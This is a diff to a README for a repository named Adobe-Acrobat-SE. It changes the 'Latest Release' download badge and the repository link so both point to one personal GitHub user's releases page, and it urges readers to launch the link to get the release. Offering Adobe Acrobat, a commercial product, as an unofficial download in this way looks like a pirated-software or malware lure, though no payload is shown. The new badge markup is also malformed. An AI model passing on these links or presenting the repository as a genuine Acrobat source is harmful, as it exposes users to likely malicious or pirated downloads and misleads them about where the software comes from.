@@ -26,11 +26,11 @@ Adobe Acrobat is a powerful software suite that provides a wide range of tools f
 - smart-pdf-tools
 
 ### 📦 Latest Release
-[![Download Release](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/releases/789694263/Release.zip)
+[![Download Release](https://github.com/nadjibbouzizi/Adobe-Acrobat-SE/releases)](https://github.com/nadjibbouzizi/Adobe-Acrobat-SE/releases)
 *Note: Ensure to launch the provided link to download the latest release.*
 
 ### 🚀 Visit the Repository
-To explore more about Adobe Acrobat and its functionalities, visit the repository at [Adobe-Acrobat-SE](https://github.com/Adobe-Acrobat-SE).
+To explore more about Adobe Acrobat and its functionalities, visit the repository at [Adobe-Acrobat-SE](https://github.com/nadjibbouzizi/Adobe-Acrobat-SE/releases).
 
 ## 🌟 Why Adobe Acrobat?
 
